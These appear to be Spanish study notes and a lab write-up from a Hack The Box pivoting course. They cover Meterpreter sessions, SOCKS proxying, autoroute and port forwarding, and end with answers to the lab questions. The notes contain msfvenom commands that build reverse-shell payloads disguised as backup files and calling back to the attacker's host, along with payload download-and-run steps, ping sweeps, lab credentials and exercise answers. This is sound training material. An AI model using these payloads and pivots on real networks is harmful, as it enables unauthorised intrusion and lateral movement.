
Ahora consideremos un escenario donde tenemos acceso a la shell de Meterpreter en el servidor Ubuntu (pivot host) y queremos realizar escaneos de enumeración a través de él, pero queremos aprovechar las ventajas de las sesiones de Meterpreter. 
Podemos crear un pivote con nuestra sesión de Meterpreter sin depender del reenvío de puertos SSH. 
Podemos crear una shell de Meterpreter para el servidor Ubuntu con el siguiente comando, que devolverá una shell en nuestro host de ataque, en el puerto 8080:

### Creando un Payload para el Ubuntu Private Host
```shell-session
Polika4RM@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

### Creando y configurando el multi/handler
Antes de copiar el Payload podemos iniciar un multi/handler genérico:
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

### Ejecutando el Payload en el Ubuntu PIVOT HOST
Podemos entonces copiar el "backupjob.elf" en el UBUNTU PIVOT HOST mediante SSH:
```shell-session
Polika4RM@htb[/htb]$ scp backupjob.elf ubuntu@<ipAddressofTarget>:~/

backupjob.elf                                   100% 7168    65.4KB/s   00:00
```

y ejercutarlo para ganar una sesión de meterpreter:
```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```
Tenemos que asegurar qye la sesión de meterpreter esté funcionando al ejecutar el payload.

### Sesión meterpreter establecida
```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```
La enviamos a segundo plano con "bg".

Sabemos que la sesión de la víctima WINDOWS se encuentra en la red 172.16.5.0/23.
Mediante meterpreter (asumiendo que los PINGs están activados), vamos a contactar con dicha máquina:
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

Podrían darse situaciones en las que el firewall de un host bloquee el ping (ICMP) y este no nos proporcione respuestas correctas. En estos casos, podemos realizar un escaneo TCP en la red 172.16.5.0/23 con Nmap. 

Alternativas para hacer ping:
##### 1. PING SWEEP desde terminal Linux
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

##### 2. Ping SWEEP desde terminal Windows (cmd)
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

##### Ping SWEEP desde terminal Windows (PowerSHell)
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

----
## Configurando el MSF's SOCKS Proxy
En otra sesión de msfconsole (dejamos abierta la anterior del meterpreter) en lugar de usar SSH para el redireccionamiento de puertos, también podemos usar el módulo de enrutamiento post-explotación de Metasploit, "socks_proxy", para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy SOCKS para la versión 4a de SOCKS. Esta configuración de SOCKS iniciará un receptor en el puerto 9050 y enrutará todo el tráfico recibido a través de nuestra sesión de Meterpreter. 

Esto crea un servidro proxy socks en mi máquina atacante. Cualquier herramienta compatible con proxy_socks (como nmap con proxychains) la podré utilizar.
Es el puente para retransmitir todo el tráfico de mis herramientas a través de la máquina ya comprometida.
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```
Se deja en segundo plano con "bg"

Confirmaremos que está funcionando con:
```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```


Tras iniciar el servidor SOCKS, configuraremos proxychains para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivot en el host Ubuntu comprometido. Podemos añadir la siguiente línea al final de nuestro archivo proxychains.conf, ubicado en /etc/proxychains.conf, si aún no está ahí:
```
nano /etc/proxychains.conf
	socks4 	127.0.0.1 9050
```

Finalmente, necesitamos indicarle a nuestro módulo socks_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el módulo post/multi/manage/autoroute de Metasploit para agregar rutas a la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas proxy.

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
Esto lo mando a "bg" background.


También es posible agregar rutas con autoroute ejecutando autoroute desde la sesión de Meterpreter:
```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar las rutas necesarias, podemos usar la opción -p para enumerar las rutas activas y asegurarnos de que nuestra configuración se aplique como se espera:

```shell-session
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

La ruta se ha añadido a la red 172.16.5.0/23. Ahora podremos usar proxychains para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.

## Probando las funcionalidades Proxy & Routing

Y efectivamente, con la sesión de meterpreter abierta mi máquina atacante desde la consola puede ver a la máquina WINDOWS_A de otra red.
```shell-session
Polika4RM@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```
---

## Port Forwarding

Un port forwarding también se puede lograr haciendo uso del módulo de meterpreter *portwd*.
Podemos tener un listener en la máquina atacante mientras que en la sesión de meterpreter podemos redireccionar todos los paquetes llegados a tal puerto de la máquina víctima. De esa forma, estarán comunicados la máquina atacante con la máquina víctima (situadas en redes distintas).

## Creando un Local TCP Relay

El siguiente comando:
- Crea un listener en el puerto 3300 de la máquina atacante. 
- Reenvía todos los paquetes (-r) al servidor windows remoto 172.16.5.19 en el puerto 3389 (-p) a través de la sesión de meterpreter.

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

Redirige el tráfico que llega a mi máquina atacante al puerto local 3300 y lo envía al puerto 3389 de la máquina 172.16.5.19  

## Conectándonoes con la máquina víctima a través del localhost del atacante
Ejecutando ahora un "xfreerdp en nuestro local host:300" podremos crear una sesión de escritorio remoto:

```shell-session
Polika4RM@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```


### Netstat Output
Podemos utilizar el comando "netstat" para ver la información sobre la sesión rdp que hemos creado recientemente:
```shell-session
Polika4RM@htb[/htb]$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```

---

## Meterpreter: reverse port forwarding
De forma similar a los redireccionamientos de puertos locales, Metasploit también puede realizar redireccionamientos de puertos inversos con el siguiente comando:
```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

Este comando permite escuchar en un puerto específico del servidor comprometido (PIVOT HOST) y redireccionar todas las shells entrantes del servidor Ubuntu a nuestro host atacante. 
Iniciaremos un receptor en un nuevo puerto de nuestra máquina atacante y pediremos al servidor UBUNTU que redireccione todas las solicitudes recibidas por el puerto '1234' a nuestro receptor en el puerto '8081'.
Le pone el 8081 porque por ahí es por donde la máquina atacante escuchará conexiones de vuelta. Es un número arbitrario.


## Configurando y inicializando el multi/handler.
Dejamos la sesión anterior de meterpreter en background (comanod "bg")

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos un reverse shell-payload que enviará una conexión a nuestro servidor UBUNTU en 172.16.5.129:1234 al ejecutarse en la máquina windows (víctima). Una vez que nuestro servidor UBUNTU reciba esa conexión, la reenviará a la máquina atacante por el puerto 8081.

#### Generando el Windows Payload
```shell-session
Polika4RM@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Generamos la reverse shell para windows y la ejecutamos en la máquina WINDOWS víctima. 


#### Estableciendo la sesión Meterpreter
```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Con esto, estableceremos la sesión Meterpreter.

---

**Target(s): 10.129.250.220**
**SSH to 10.129.250.220 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"**
**1. What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

Realizo un escaneo básico de nmap y observo que tengu un servicio SSH y un servicio HTTP.
```
map -sCV -Pn -n 10.129.250.220 --open --min-rate 2000

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Genero msfvenom para establecer una sesión de meterpreter, ya que tengo credenciales SSH.
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 -f elf -o meterpreter_ubuntu LPORT=8080
```

Lo comparto por servidor http:
```
python3 -m http.server
```

Y me lo descargo desde una sessión SSH con:
```
ssh ubuntu@10.129.250.220

ubuntu@WEB01:~$ wget http://10.10.14.176:8000/meterpreter_ubuntu
```

Abro un msfconsole desde el atacante y ejecuto:
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Ejecutamos desde la sesión de ubuntu el exploit: 
```
ubuntu@WEB01:~$ ./meterpreter_ubuntu
```

Y nos establece la sesión meterpreter correctamente: 
```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 0.0.0.0:8080 
[*] Sending stage (3090404 bytes) to 10.129.250.220
[*] Meterpreter session 1 opened (10.10.14.176:8080 -> 10.129.250.220:42592) at 2025-10-23 04:29:02 -0500
```


En el SSH, realizo un IP A y me doy cuenta que tiene la interfaz 172.16.5.0/23 disponible.

Realizo pues desde meterpreter un: 
```
(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Pero me da error. 

Pruebo desde la terminal ssh:
```
ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.446 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.039 ms
```

Y me devuelve 2 hosts: 172.16.5.19,172.16.5.129

Respuesta: 172.16.5.19,172.16.5.129



**2. Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**
Explicación breve: la máscara 255.255.254.0 (/23) cubre el rango 172.16.4.0 — 172.16.5.255, por tanto incluye a `172.16.5.19`.

Respuesta: `172.16.4.0/255.255.254.0`